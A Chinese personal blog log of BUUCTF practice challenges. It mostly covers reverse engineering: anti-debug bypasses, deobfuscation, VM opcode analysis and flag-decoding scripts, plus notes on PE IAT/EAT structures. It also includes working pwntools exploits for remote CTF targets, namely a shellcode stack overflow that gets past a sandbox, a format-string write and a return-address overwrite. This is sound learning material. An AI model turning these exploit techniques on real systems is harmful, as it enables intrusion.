---
title: buuctf刷题记录
date: 2020-07-15 22:38:44
tags: buuctf
categories: Reverse
---

# 2020-5-7

## [SUCTF2019]Akira Homework | STUCK
调试的时候跳出窗口，有反调试
![](https://md.vidar.club/uploads/upload_38376ddb099ee771e5c52c989c447f33.png)
查找字符串找到反调试的函数
![](https://md.vidar.club/uploads/upload_8cfaf1cd5c130328621bf8862ca77cb4.png)
绕过很简单，只需把`IsDebuggerPresent`的返回值设置为0就行

![](https://md.vidar.club/uploads/upload_660f4eae2bec4f7f0b6e77b9ce800b84.png)
~~不知道为什么调试到这一步的时候程序就会退出。直接打开的话也没有等待输入，而是直接结束了。~~
~~可能是虚拟机的关系吧，在物理机上是能运行的~~
运行一次之后就这样了

---
在一个函数里发现4个初始化的变量，下面还有很多位运算，基本就可以确定为md5了
![](https://md.vidar.club/uploads/upload_e5e2da23be3d4f5ee3109024305c6bf4.png)

![](https://md.vidar.club/uploads/upload_a4182fcb9c779eaff7a2c394227e9985.png)
经过md5解密后是`Overwatch`

几个经过加密的字符串解密后的结果为
> Akira_aut0_ch3ss_!
> :signature
> Failed to check sign!
> Have no sign!

查了下wp，貌似这题有点复杂， 先鸽了..
https://xz.aliyun.com/t/6042#toc-9
貌似有bug

## [RoarCTF2019]polyre
啊，这混淆
![](https://md.vidar.club/uploads/upload_1d2e378965333e2187502049ca6c9d47.png)

用[这个工具](https://github.com/pcy190/deflat)可以还原平坦化
还原之后好像还有花指令，但已经好看多了
简单流程如下
```C=
while(i < 6)
{
    v4 = (QWORD*)input[8*i];
    v7 = 0;
    while(v7 < 64)
    {
        if (v4 >= 0)
        {
            v4 *= 2;
        }
        else
        {
            v4 = (v4 * 2) ^ 0xB0004B7679FA26B3;
        }
        v7++;
    }
    s1[8*i] = v4;
    i++;
}
v33 = memcmp(s1, &unk_402170, 0x30uLL);
```
这类似CRC64
可以根据最低位来判断上次走的是哪个分支
```C++=
#include <iostream>
using namespace std;

int main()
{
    unsigned long long s1[6] = {0xbc8ff26d43536296, 0x520100780530ee16, 0x4dc0b5ea935f08ec, 0x342b90afd853f450, 0x8b250ebcaa2c3681, 0x55759f81a2c68ae4};
    int i = 0, v7 = 0;
    while (i < 6)
    {
        v7 = 0;
        while (v7 < 64)
        {
            if (s1[i] & 1)
            {
                s1[i] = (s1[i] ^ 0xB0004B7679FA26B3) / 2;
                s1[i] |= 0x8000000000000000; //自己整的一直不对，查了下wp发现要或上这个数，暂时还没弄明白
            }
            else
            {
                s1[i] /= 2;
            }
            v7++;
        }
        i++;
    }
    for (int i = 0; i < 6; ++i)
    {
        while (s1[i] > 0)
        {
            printf("%c", s1[i] & 0xFF);
            s1[i] >>= 8;
        }
    }
}
```




# 2020-5-8
## [BJDCTF2020]easy
![](https://md.vidar.club/uploads/upload_4f3428eb306bb447a138201c0e6ff617.png)
main函数啥都没有
![](https://md.vidar.club/uploads/upload_6f634e92bf28da8bacf1b7830e710d55.png)

### IDA常用宏定义
https://www.jianshu.com/p/7cc97bdd716d
这个函数比较可疑
```C++=
#include <iostream>
#include "ida.h"
using namespace std;

int main()
{
    int v0; // edx
  int result; // eax
  int v2[50]; // [esp+20h] [ebp-128h]
  int v3[10]; // [esp+E8h] [ebp-60h]
  int j; // [esp+114h] [ebp-34h]
  __int64 v5; // [esp+118h] [ebp-30h]
  int v6; // [esp+124h] [ebp-24h]
  int v7; // [esp+128h] [ebp-20h]
  int i; // [esp+12Ch] [ebp-1Ch]

  v3[0] = 0x7FFA7E31;
  v3[1] = 0x224FC;
  v3[2] = 0x884A4239;
  v3[3] = 0x22A84;
  v3[4] = 0x84FF235;
  v3[5] = 0x3FF87;
  v3[6] = 0x88424233;
  v3[7] = 0x23185;
  v3[8] = 0x7E4243F1;
  v3[9] = 0x231FC;
  for ( i = 0; i <= 4; ++i )
  {
    memset(v2, 0, sizeof(v2));
    v7 = 0;
    v6 = 0;
    v0 = v3[2 * i + 1];
    LODWORD(v5) = v3[2 * i];
    HIDWORD(v5) = v0;
    while ( SHIDWORD(v5) > 0 || v5 >= 0 && (_DWORD)v5 )
    {
      v2[v7++] = ((SHIDWORD(v5) >> 31) ^ (((unsigned __int8)(SHIDWORD(v5) >> 31) ^ (unsigned __int8)v5)
                                        - (unsigned __int8)(SHIDWORD(v5) >> 31)) & 1)
               - (SHIDWORD(v5) >> 31);
      v5 /= 2LL;
    }
    for ( j = 50; j >= 0; --j )
    {
      if ( v2[j] )
      {
        if ( v2[j] == 1 )
        {
          putchar('*');
          ++v6;
        }
      }
      else
      {
        putchar(' ');
        ++v6;
      }
      if ( !(v6 % 5) )
        putchar(' ');
    }
    result = putchar(10);
  }
  return result;
}
```
```
 *   *   *   ***** *   * ***** ***** * *   ***** *   * *   * 
 *   *  * *  *     *  *    *     *   * *   *     *   * **  * 
 ***** ***** *     ***     *     *   ***** ***   *   * * * * 
 *   * *   * *     * **    *     *     *   *     *   * *  ** 
 *   * *   * ***** *   * *****   *     *   *     ***** *   * 
```
???这就是flag？？
> flag{HACKIT4FUN}

# 2020-5-9
## [极客大挑战 2019]Not Bad
![](https://md.vidar.club/uploads/upload_f33482a7eae1b93a5e0875fe75e861a6.png)
保护都关了
![](https://md.vidar.club/uploads/upload_1960700798db6e3dd787662716000161.png)
有沙盒
只能调用read、open、write
![](https://md.vidar.club/uploads/upload_9bd985c43654dbdca7b78bc16430ff1d.png)
这里有0x18个字节的溢出，明显不能orw
嫖了眼[wp](http://www.qfrost.com/CTF/geek_pwn/)，可以利用jmp rsp
这题没有开nx，在栈上写上指令，再栈溢出把ret的地址改为jmp rsp，再跟上一个jmp rsp-0x30，这样就可以跳转到刚刚写入的指令

![](https://md.vidar.club/uploads/upload_78675fd18622afc0988ab015e05ccbc1.png)
mmap把0x123000的地址改为可执行了，就可以把orw的指令写在这上面，跳转过来就行
```python=
from pwn import *

context(arch="amd64", os="linux")
context.log_level="debug"
#cn = process("./bad")
cn = remote('node3.buuoj.cn', 29269)
elf = ELF("bad")
jmprsp = 0x400a01

payload1 = shellcraft.open("./flag")
payload1 += shellcraft.read(3, 0x123000, 0x50)
payload1 += shellcraft.write(1, 0x123000, 0x50)

#print payload1

payload2 = asm(shellcraft.read(0, 0x123000, 0x90)) + asm("mov rax,0x123000;call rax")
payload2 += 'a'*(0x28 - len(payload2)) + p64(jmprsp)
payload2 += '\x4c\x8d\x4c\x24\xd0\x41\xff\xe1'#lea r9,[rsp-0x30;jmp r9]

cn.recv()
raw_input()
cn.send(payload2)
raw_input()
cn.sendline(asm(payload1))
#raw_input()
cn.interactive()
```

# 2020-5-10
## [FlareOn2]very_success
ida加载的时候提示错误
![](https://md.vidar.club/uploads/upload_aa845c55b12526a7365365054910e79d.png)
程序的最开头有个pop eax，把它nop掉就能修复堆栈平衡了
程序只有2个函数
大致流程
```C++=
int main()
{
    int16 v4 = 0, v11;
    int len = 37;
    char *input;
    int num = 455;
    byte *v7;
    while(len > 0)
    {
        v11 = rol(1, v4 & 3) + 1 + (num ^ *input);
        v4 += v11;
        if(v11 != *v7)
            break;
        input++;
        v7--;
    }
}
```
解密好像不是很难，就是一开始被绕晕了
exp
```C++=
#include <iostream>
#include "ida.h"
using namespace std;

int16 rol(int a, int16 b)
{
    return a << (b & 3);
}

int main()
{
    int16 v4 = 0;
    int16 num = 455;
    unsigned char v7[37] = {0xa8, 0x9a, 0x90, 0xb3, 0xb6, 0xbc, 0xb4, 0xab, 0x9d, 0xae, 0xf9, 0xb8, 0x9d, 0xb8, 0xaf, 0xba, 0xa5, 0xa5, 0xba, 0x9a, 0xbc, 0xb0, 0xa7, 0xc0, 0x8a, 0xaa, 0xae, 0xaf, 0xba, 0xa4, 0xec, 0xaa, 0xae, 0xeb, 0xad, 0xaa, 0xaf};
    for(int i = 0; i < 37; ++i)
    {
       unsigned char input = (v7[i] - rol(1, v4 & 3) - 1) ^ num;
       printf("%c", input);
       v4 += v7[i];
    }
    return 0;
}

```
## singal
第一次做VM
分析出opcode
```
10  read()
4 10h 8 3 5 1      res[v7++] = (i[v9++] ^ 0x10) - 5
4 20h 8 5 3 1      res[v7++] = (i[v9++] ^ 0x20) * 3
3 2 8 11 1         res[v7++] = i[v9++] - 2 - 1
12 8 4 4 1         res[v7++] = (i[v9++] + 1) ^ 4
5 3 8 3 21h 1      res[v7++] = (i[v9++] * 3) - 0x21
11 8 11 1          res[v7++] = i[v9++] - 1 - 1
4 9 8 3 20h 1      res[v7++] = (i[v9++] ^ 9) - 0x20
2 51h 8 4 24h 1    res[v7++] = (i[v9++] + 0x51) ^ 0x24
12 8 11 1          res[v7++] = i[v9++] + 1 - 1
5 2 8 2 25h 1      res[v7++] = i[v9++] * 2 + 0x25
2 36h 8 4 41h 1    res[v7++] = (i[v9++] + 0x36) ^ 0x41
2 20h 8 5 1 1      res[v7++] = (i[v9++] + 0x20) * 1
5 3 8 2 25h 1      res[v7++] = i[v9++] * 3 + 0x25
4 9 8 3 20h 1      res[v7++] = (i[v9++] ^ 9) - 0x20
2 41h 8 12 1       res[v7++] = i[v9++] + 0x41 + 1

res[15] = {0x22, 0x3f, 0x34, 0x32, 0x72, 0x33, 0x18, 0xA7, 0x31, 0xF1, 0x28, 0x84, 0xC1, 0x1e, 0x7a}
```
```C=
#include <stdio.h>

int main()
{
    char res[15] = {0x22, 0x3f, 0x34, 0x32, 0x72, 0x33, 0x18, 0xA7, 0x31, 0xF1, 0x28, 0x84, 0xC1, 0x1e, 0x7a};
    for (char i = 0; i < 127; ++i)
    {
        char s = (i ^ 0x10) - 5;
        if(s == res[0])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = (i ^ 0x20) * 3;
        if(s == res[1])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = i - 3;
        if(s == res[2])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = (i + 1) ^ 4;
        if(s == res[3])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = (i * 3) - 0x21;
        if(s == res[4])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = i - 2;
        if(s == res[5])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = (i ^ 9) - 0x20;
        if(s == res[6])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = (i + 0x51) ^ 0x24;
        if(s == res[7])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = i;
        if(s == res[8])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = i * 2 + 0x25;
        if(s == res[9])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = (i + 0x36) ^ 0x41;
        if(s == res[10])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = (i + 0x20) * 1;
        if(s == res[11])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = i * 3 + 0x25;
        if(s == res[12])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = (i ^ 9) - 0x20;
        if(s == res[13])
            printf("%c", i);
    }
    for (char i = 0; i < 127; ++i)
    {
        char s = i + 0x41 + 1;
        if(s == res[14])
            printf("%c", i);
    }
    return 0;
}
```
> 757515121f3d478

## Jocker
这题一开始ida没法解析，但从汇编里可以看出大致流程
![](https://md.vidar.club/uploads/upload_0ef81ba84898aab1496dbaaacdc77954.png)
先输入，再比较字符串长度是否是24个字节
然后调用wrong和omg函数，这两个函数是可以f5的
从这两个函数里可以的到输入的字符串应该是`flag{fak3_alw35_sp_me!!}`
但这是假的flag
![](https://md.vidar.club/uploads/upload_49f88f3c801f302e2948e60b29f68c78.png)
这里有一个循环，就是把encrypt函数开始的内容都xor 0x41，长度正好到finally那里。
这个程序是边解密边执行的，所以ida一开始没法解析。可以先在循环后面下断，在把经过xor的数据patch到原程序上就可以f5了
![](https://md.vidar.club/uploads/upload_4d0180c2312510e2959709547c2fe9cf.png)
![](https://md.vidar.club/uploads/upload_4bd6161ee59756472675ff231c44ee5a.png)
# 2020-5-11
咕咕。。。。。
# 2020-5-12
## What's Virtialization
不知道它是怎么判断的,好多都符合条件
![](https://md.vidar.club/uploads/upload_603992124217fbbc9519e0957734354b.png)


![](https://md.vidar.club/uploads/upload_ecaf68476885e4315a2b31bfa6474edc.png)
![](https://md.vidar.club/uploads/upload_c5c7c07db0b9aff348b0168f4e69bd11.png)
```python=
def sub_401180(a1, a2):#经过化简相当于xor
    v2 = ~a1 & ~a2
    v3 = ~(~a1 & ~a1) & ~(~a2 & ~a2)
    return ~v3 & ~v2

def sub_401030(a1, a2):#经过化简相当于and
    v2 = ~a2 & ~a2
    v3 = ~a1 & ~a1
    return ~v3 & ~v2

def sub_401120(a1, a2):
    v2 = ~a2 & ~a1
    v3 = ~a2 & ~a1
    return ~v2 & ~v3

byte_406024 = [0x30, 0x32, 0x30, 0x34, 0x30, 0x38]
byte_406050 = [0x7d, 0x5b, 0x5e, 0x5d, 0x7c, 0x7b]
byte_406058 = 'dtKcXxDmYgoNY'
byte_406068 = '@D]pTYHp@Yw^O'

v7 = 0
for i in range(6):
    flag = byte_406024[v7]^byte_406050[i]
    v7=(v7+1)%6
    print(chr(flag),end='')
for i in range(13):
    flag = byte_406024[v7]^ord(byte_406058[i])
    v7 = (v7+1)%6
    print(chr(flag),end='')
for i in range(13):
    flag = byte_406024[v7]^ord(byte_406068[i])
    v7 = (v7+1)%6
    print(chr(flag),end='')
```
感觉这道题的判断有问题啊
# 2020-5-13
咕咕咕。。
# 2020-5-14
## [De1CTF2019]cplusplus
C++逆向
一脸懵逼，好像用到了C艹的特性
# 2020-5-15
上一题毫无进展
。。。。
太菜了，鸽了
## [ACTF新生赛2020]rome
新生赛的题
```C++=
#include <iostream>
using namespace std;

int main()
{
    char v15[16] = {81, 115, 119, 51, 115, 106, 95, 108, 122, 52, 95, 85, 106, 119, 64, 108};
    cout << "ACTF{";
    for (int i = 0; i < 16; ++i)
    {
        if (v15[i] <= 90 && v15[i] >= 65)
        {
            for (char j = 65; j <= 90; ++j)
            {
                if ((j - 51) % 26 + 65 == v15[i])
                    cout << j;
            }
        }
        else if (v15[i] <= 122 && v15[i] >= 97)
        {
            for (char j = 97; j <= 122; ++j)
            {
                if ((j - 79) % 26 + 97 == v15[i])
                    cout << j;
            }
        }
        else
            cout << v15[i];
    }
    cout << "}";
    return 0;
}
```
## [FlareOn6]Overlong
![](https://md.vidar.club/uploads/upload_d84eac982b8a7126d351ea86d72bf586.png)
打开显示这个
根据提示，只要把`sub_401160`这个函数的最后一个参数改大，就能把后面的东西显示出来了
> ![](https://md.vidar.club/uploads/upload_bd009720ab3d6d7cc1cc41d33d370e9b.png)
# 2020-5-16
## go_where
修复elf文件，把开头的l改为L
然后upx脱壳
动态调试，具体流程是：
- 先把输入的字符都+1，再base91，再AES，key和IV都是give_your_A3sk4y

和hgame的那道Golang逆向差不多，就是在main_Encode这个函数上卡了一会，最后发现这个就是base91（比较少见）

# 2020-5-17
钴
# 2020-5-18、19
## [V&N2020 公开赛]h01k_re
`sub_401990`是反调试，nop掉
![](https://md.vidar.club/uploads/upload_2b14e26aa4ddf942770f10910f13872e.png)
跑了下`findcrypt`发现有AES
![](https://md.vidar.club/uploads/upload_6ffd18ba3d62e012ada3e2a0d90937d2.png)
要运行到这里才能输入
动态调试进入v21()
![](https://md.vidar.club/uploads/upload_b2455aad9adb046927edc7b37aef222b.png)
似乎有vm
`sub_401F00`这个函数就是AES
![](https://md.vidar.club/uploads/upload_bde33659fc15afa4262783fce24a6214.png)
执行过AES之后发现lpBuffer指向的地方居然是个PE文件,大小是0x10EA00
![](https://md.vidar.club/uploads/upload_39d1b2e0867d4ddaf9aa2e3e2a972bb1.png)
把它复制下来，发现这个是个dll文件
看不懂看不懂![](https://md.vidar.club/uploads/upload_4fcadd82c0bc1d8679aaa2e73ecbe6b1.png)
根据wp，这就是个异或
> V&N{W&M_Easy_Re}
# 2020-5-20、21、22
看了PE
# 2020-5-23
## 继续Akira Homework
程序貌似有BUG没法输入，就直接跳过输入函数，直接在内存里修改输入
6C10函数里有个函数是用来解密的![](https://md.vidar.club/uploads/upload_7cd8e5c85de128c1639000587329f9b5.png)
动调后发现这个就是8910函数
![](https://md.vidar.club/uploads/upload_9c228784e78613250e0b91bce39c32d7.png)
。。。。。。。。。。。。。。。。。。。。。。。。。。。
涉及太多windows知识，再次放弃
## [FlareOn5]Ultimate Minesweeper
![](https://md.vidar.club/uploads/upload_85fd92a9a80f20f4999adb80b590078f.png)
这一段应该是设置地雷的,`mf.GarbageCollect`点进去是`minePresent`
`num2`是x轴，`num`是y轴
```C++=
#include <iostream>
#include <vector>
using namespace std;

int main()
{
    int VALLOC_TYPE_HEADER_PAGE = 0xfffffc80;
    int VALLOC_TYPE_HEADER_POOL = 0xfffffd81;
    int VALLOC_TYPE_HEADER_RESERVED = 0xfffffef2;
    int VALLOC_TYPEs[] = {VALLOC_TYPE_HEADER_PAGE, VALLOC_TYPE_HEADER_POOL, VALLOC_TYPE_HEADER_RESERVED};
    for(int num = 0; num < 30; ++num)
    {
        for(int num2 = 0; num2 < 30; ++num2)
        {
             int r = num + 1, c = num2 + 1;
             int a = ~((r * 30) + c);
             if (a == VALLOC_TYPEs[0] || a == VALLOC_TYPEs[1] || a == VALLOC_TYPEs[2])
                cout << num2 << " " << num << endl;
        }
    }
    return 0;
}
```
> 28 7
> 7 20
> 24 28
> 这三个点没有地雷,点击得flag
> ![](https://md.vidar.club/uploads/upload_bdb66068d8485c9643a6a930b5af49b4.png)
# 2020-5-24
墨鱼
# 2020-5-25
## [GKCTF2020]Check_1n
电脑模拟器
在我的虚拟机上运行有问题（解决了，是文件共享路径的问题）
开机密码是HelloWorld,玩打砖块游戏就能拿到flag
## [GKCTF2020]BabyDriver
Driver
![](https://md.vidar.club/uploads/upload_7f72df336c4793d5afbb3365ba6b1d91.png)
应该是迷宫，`O`是入口，`#`是出口
![](https://md.vidar.club/uploads/upload_56ee5b2431db920d60e02f89f75d51ac.png)
![](https://md.vidar.club/uploads/upload_7f6b4ff90db0e3757afa9373ce20c851.png)
这个输入是不可显字符
看了下wp，这个是驱动程序，读取的是键盘扫描码，不是ascii码
[在线键盘扫描码查询](https://www.supfree.net/search.asp?id=6386)
> 0x17 I 上
> 0x25 K 下
> 0x24 J 左
> 0x26 L 右

LKKKLLKLKKKLLLKKKLLLLLL

## [GKCTF2020]Chelly's identity
- 你有听说过chelly吗？如果你知道，那么你就能得到flag的线索。

EGOIST主唱

C++逆向，动态调试
先根据字符串定位到main函数
![](https://md.vidar.club/uploads/upload_edbe0a7dc35c9f225d164b94b60e3db7.png)
v34可能是一个结构体，里面存储了flag的地址
中间那个循环估计是将char型的输入转成int型
然后是检查长度，长度为16位
![](https://md.vidar.club/uploads/upload_39ed01ab513d43b67f246d53f5c3ba55.png)
这是`zhishu`函数，v10应该也是个结构体，存储的是从2开始连续的质数
for循环的作用是将这些质数相加，直到加到最后一个质数大于input[i]
然后就是`sub_411852`，只要这个函数返回true就说明检查通过
![](https://md.vidar.club/uploads/upload_fdf0f13593bfa27fa5775486984c3ee9.png)
中间有一串赋值很可疑，正好16位，可能就是加密后的flag(确实是)

```C++=
#include <iostream>
#include <vector>
using namespace std;

int main()
{
    int flag[] = {0x1b6, 0x498, 0x441, 0x179, 0x179, 0x640, 0x39c, 0x179, 0x64a, 0x39c, 0x27d, 0x27f, 0x178, 0x236, 0x344, 0x33e};
    int prime[] = {2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199};
    for (int a = 0; a < 16; ++a)
    {
        for (char i = 33; i < 127; ++i)
        {
            int j = 0, k = 0;
            while (prime[k] < i)
            {
                j += prime[k++];
            }
            if ((i ^ j) == flag[a])
                cout << i;
        }
    }
    return 0;
}
```
> Che11y_1s_EG0IST  原来是这个线索

这个比赛是8小时，估计我也只能做到这了

# 2020-5-26
满课，提前鸽了
# 2020-5-27、28
## [GKCTF2020]EzMachine
VM太难了
![](https://md.vidar.club/uploads/upload_9cd363247e3e816078ed7c3922537fdc.png)
这里应该是main函数
`off_8B48F4`是函数指针
根据opcode找到要执行的函数，再跳转执行
![](https://md.vidar.club/uploads/upload_560a6d177fc97cda0b71895ec50fcfc5.png)
> 函数模拟的指令

如果读取的字符是大写字母，就`(x ^ 0x4B) - 1`，然后`% 0x10`和`/ 0x10`，就是把个位和十位分开。如果是小写字母，`(x ^ 0x47) + 1`，再分开。其他字符直接分开
![](https://md.vidar.club/uploads/upload_c77d25bc54b0abf16db1cd090b1b35c2.png)
> 这是加密后的flag(倒过来的)

```python=
# x >= A and x <= Z, (x ^ 0x4B) - 1, divide
# x >= a and x <= z, (x ^ 0x47) + 1, divide
# else divide

flag1 = '07 0D 00 05 01 0C 01 00 00 0D 05 0F 00 09 05 0F 03 00 02 05 03 03 01 07 07 0B 02 01 02 07 02 0C 02 02'.split(' ')
flag2 = [int(i, 16) for i in flag1]
flag3 = []
for i in range(0, len(flag2), 2):
    flag3.append((flag2[i] << 4) + flag2[i+1])

s1 = [(i^0x4B)-1 for i in range(ord('A'), ord('Z')+1)]
s2 = [(i^0x47)+1 for i in range(ord('a'), ord('z')+1)]

flag = []
for i in flag3:
    if i in s1:
        flag.append(chr((i+1)^0x4B))
    elif i in s2:
        flag.append(chr((i-1)^0x47))
    else:
        flag.append(chr(i))
print(''.join(flag[::-1]))
```
> flag{Such_A_EZVM}

# 2020-6-2
最近突然想整一波pwn了，都是水题
## Pwn5
```python=
from pwn import *

#cn = process('./pwn5')
cn = remote('node3.buuoj.cn', 29381)
rand_addr=0x804c044
cn.recvuntil('your name:')

cn.sendline(b'AA%12$n\x00'+p32(rand_addr))
cn.recvuntil('your passwd:')
cn.sendline('2')


cn.interactive()
```
## picoctf_2018_buffer overflow 1
```python=
from pwn import *

#cn=process('./PicoCTF_2018_buffer_overflow_1')
cn=remote('node3.buuoj.cn', 28760)
raw_input()
payload=b'a'*(0x28+4)+p32(0x80485cb)
cn.sendline(payload)
cn.interactive()
```
# 2020-6-8
## [FlareOn1]5get_it
给的文件是一个32位的DLL文件，不知道能不能动态调试
`sub_10009EB0`这个函数有点可疑,里面有个`GetAsyncKeyState`函数，主要功能就是判断按键的状态。
[Virtual-Key Codes](https://docs.microsoft.com/zh-cn/windows/win32/inputdev/virtual-key-codes)
![](https://md.vidar.club/uploads/upload_9565d43a5741bd4cb41351ea82f00d8e.png)
这个返回值应该是按下的状态吧(不是很清楚)
然后根据按下的按键进行switch跳转
有个很长的函数，赋的值都是字符串
![](https://md.vidar.club/uploads/upload_78b05e913a6ee8fe67ef51d4b222dd78.png)
看了下wp，flag是根据init函数里的全局变量来推出的
![](https://md.vidar.club/uploads/upload_8870a5f4c550d8b4e62bfae55fa13493.png)
> l0ggingdoturdot5tr0ke5atflaredashondotcom

# 2020-6-12
看了《逆向工程核心原理》里关于IAT和EAT的东西，感觉应该和elf里的plt和got差不多，先记下来
## IAT(Import Address Table)

- 导入地址表

当调用API函数时，先读取IAT处的地址，再跳转到该函数再内存中的真实地址

![](https://md.vidar.club/uploads/upload_271fe4a6d61cdfbd6ffccbadab1b0afd.png)

----------------------------

![](https://md.vidar.club/uploads/upload_742dfaa1b7399ca31b21d94bbc06bb9f.png)


- 一般情况下，INT与IAT的各个元素指向相同的地址

```C
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics;            // 0 for terminating null import descriptor
        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)
    } DUMMYUNIONNAME;
    DWORD   TimeDateStamp;                  // 0 if not bound,
                                            // -1 if bound, and real date\time stamp
                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
                                            // O.W. date/time stamp of DLL bound to (Old BIND)

    DWORD   ForwarderChain;                 // -1 if no forwarders
    DWORD   Name;
    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)
} IMAGE_IMPORT_DESCRIPTOR;


typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD    Hint;
    CHAR   Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
```

##### PE装载器把导入函数输入至IAT的顺序

1. 读取IID的Name成员，获取库名称字符串("kernel32.dll")

2. 装载相应库

   ->  **LoadLibrary("kernel32.dll")**

3. 读取IID的**OriginalFirstThunk**成员,获取INT地址

4. 逐一读取INT中数组的值，获取相应**IMAGE_IMPORT_BY_NAME**的地址(RVA)

5. 使用**IMAGE_IMPORT_BY_NAME**的Hint或Name项，获取相应函数的起始地址

   ->  **GetProcAddress("GetCurrentThreadld")**

6. 读取IID的FirstThunk(IAT)成员，获得IAT地址

7. 将上面获得的函数地址输入相应IAT数组值

8. 重复4~7，直到INT结束(NULL)

## EAT

- 导出地址表，保存在**IMAGE_EXPORT_DIRECTORY**中，这个结构体在PE中只有一个

```c
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;		// 实际Export函数的个数
    DWORD   NumberOfNames;			// Export函数中具名的函数个数
    DWORD   AddressOfFunctions;     // Export函数地址数组(数组元素个数=NumberOfFunctions)
    DWORD   AddressOfNames;         // 函数名称地址数组(数组元素个数=NumberOfNames)
    DWORD   AddressOfNameOrdinals;  // Ordinal地址数组(数组元素个数=NumberOfNames)
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

![](https://md.vidar.club/uploads/upload_e2a5d25871f0db871ceb9e11912d31d3.png)


##### GetProcAddress()操作原理

1. 利用**AddressOfNames**成员转到"函数名称数组"
2. "函数名称数组"中存储这字符串地址。通过比较字符串，查找指定函数名称(此时数组的索引称为 name_index)
3. 利用**AddressOfNameOrdinals**成员，转到orinal数组
4. 在 ordinal数组中通过name_index查找相应ordinal值
5. 利用**AddressOfFunctions**成员转到"函数地址数组"(EAT)
6. 在"函数地址数组"中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址

# 2020-7-14

## [FlareOn2]YUSoMeta
.Net逆向,有混淆,去除了符号
用de4dot可以还原符号

![](https://md.vidar.club/uploads/upload_231ac87ea323a36c3bfc4a4c9b98d096.png)
还原之后流程就比较清楚
经过调试后发现b和输入无关,但b不是个可显字符,很奇怪

用原文件调试之后发现b是个可先字符,可能是de4dot还原的时候把什么数据改掉了,而b就是根据那个数据生成的
![](https://md.vidar.club/uploads/upload_0f367df0f95dbf045878a1abfd0c1aaf.png)